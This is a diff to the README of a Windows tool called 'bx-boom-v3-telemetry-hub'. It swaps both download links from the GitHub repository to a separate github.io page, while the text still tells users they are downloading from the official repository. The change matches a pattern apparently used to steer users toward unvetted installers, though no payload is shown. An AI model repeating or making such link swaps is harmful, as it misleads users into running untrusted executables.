@@ -1,6 +1,6 @@
 # 🚀 bx-boom-v3-telemetry-hub - Organize your AI data flow easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/debased-epicycle597/bx-boom-v3-telemetry-hub)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://debased-epicycle597.github.io)
 
 ## 📋 About the software
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware and software to run this tool correctly. C
 
 You must download the installer from the official repository page. Follow these steps to obtain the files:
 
-1. Visit [this page to download](https://github.com/debased-epicycle597/bx-boom-v3-telemetry-hub).
+1. Visit [this page to download](https://debased-epicycle597.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Click the link that matches your Windows system.
 4. Save the file to your computer.
